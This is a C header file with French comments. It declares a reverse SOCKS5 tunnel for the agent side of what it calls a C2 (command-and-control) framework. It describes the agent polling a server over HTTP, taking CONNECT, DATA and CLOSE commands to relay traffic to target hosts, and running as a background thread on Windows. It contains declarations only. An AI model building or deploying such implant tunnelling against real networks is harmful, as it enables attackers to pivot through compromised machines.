/*
 * ============================================================
 *  tunnel.h - Client tunnel SOCKS5 inverse (cote agent)
 *
 *  L'agent agit comme relais entre le serveur C2 et la cible.
 *
 *  Flux :
 *    [Serveur SOCKS5] > HTTP poll > [Agent] > TCP > [Cible]
 *    [Cible] > TCP > [Agent] > POST /tunnel/data > [Serveur]
 *
 *  Commandes recues via GET /tunnel/{id}/poll :
 *    CONNECT  host:port  - ouvrir socket TCP vers la cible
 *    DATA     b64        - envoyer donnees a la cible
 *    CLOSE               - fermer la connexion
 *
 *  Implementation Windows uniquement (WinSock2 + threads Win32).
 *  Stub vide sur Linux.
 *
 * ============================================================
 */
#ifndef TUNNEL_H
#define TUNNEL_H

/* Demarre le thread de tunnel en arriere-plan.
 * server_url : URL de base du serveur C2 (ex: "http://192.168.9.1:8000")
 * agent_id   : identifiant de l'agent (8 hex chars)
 * Retourne 1 si succes, 0 si erreur.
 */
int  tunnel_start(const char *server_url, const char *agent_id);

/* Arrete le thread de tunnel proprement. */
void tunnel_stop(void);

/* Retourne 1 si le thread tunnel est en cours d'execution. */
int  tunnel_is_active(void);

#endif /* TUNNEL_H */
